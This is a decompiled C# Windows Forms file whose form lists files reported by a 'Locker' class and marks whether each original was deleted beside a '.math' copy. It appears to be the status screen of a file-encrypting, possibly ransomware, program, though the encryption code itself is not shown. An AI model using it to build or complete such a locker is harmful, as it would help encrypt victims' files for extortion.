using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using Main.Tools;

namespace Main;

public class FormEncryptedFiles : Form
{
	private IContainer components;

	private DataGridView dataGridViewEncryptedFiles;

	private DataGridViewTextBoxColumn ColumnDeleted;

	private DataGridViewTextBoxColumn ColumnPath;

	public FormEncryptedFiles()
	{
		InitializeComponent();
	}

	private void FormEncryptedFiles_Load(object sender, EventArgs e)
	{
		foreach (string encryptedFile in Locker.GetEncryptedFiles())
		{
			if (File.Exists(encryptedFile + ".math"))
			{
				dataGridViewEncryptedFiles.get_Rows().Add(new object[2] { "", encryptedFile });
			}
			else
			{
				dataGridViewEncryptedFiles.get_Rows().Add(new object[2] { "YES", encryptedFile });
			}
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		dataGridViewEncryptedFiles = new DataGridView();
		ColumnDeleted = new DataGridViewTextBoxColumn();
		ColumnPath = new DataGridViewTextBoxColumn();
		((ISupportInitialize)dataGridViewEncryptedFiles).BeginInit();
		((Control)this).SuspendLayout();
		dataGridViewEncryptedFiles.set_ColumnHeadersHeightSizeMode((DataGridViewColumnHeadersHeightSizeMode)2);
		dataGridViewEncryptedFiles.get_Columns().AddRange((DataGridViewColumn[])(object)new DataGridViewColumn[2]
		{
			(DataGridViewColumn)ColumnDeleted,
			(DataGridViewColumn)ColumnPath
		});
		((Control)dataGridViewEncryptedFiles).set_Dock((DockStyle)5);
		((Control)dataGridViewEncryptedFiles).set_Location(new Point(0, 0));
		((Control)dataGridViewEncryptedFiles).set_Name("dataGridViewEncryptedFiles");
		((Control)dataGridViewEncryptedFiles).set_Size(new Size(594, 326));
		((Control)dataGridViewEncryptedFiles).set_TabIndex(0);
		((DataGridViewColumn)ColumnDeleted).set_HeaderText("Deleted");
		((DataGridViewColumn)ColumnDeleted).set_Name("ColumnDeleted");
		((DataGridViewBand)ColumnDeleted).set_ReadOnly(true);
		((DataGridViewColumn)ColumnDeleted).set_Width(50);
		((DataGridViewColumn)ColumnPath).set_HeaderText("Path");
		((DataGridViewColumn)ColumnPath).set_Name("ColumnPath");
		((DataGridViewBand)ColumnPath).set_ReadOnly(true);
		((DataGridViewColumn)ColumnPath).set_Width(500);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(594, 326));
		((Control)this).get_Controls().Add((Control)(object)dataGridViewEncryptedFiles);
		((Control)this).set_Name("FormEncryptedFiles");
		((Control)this).set_Text("EncryptedFiles");
		((Form)this).add_Load((EventHandler)FormEncryptedFiles_Load);
		((ISupportInitialize)dataGridViewEncryptedFiles).EndInit();
		((Control)this).ResumeLayout(false);
	}
}
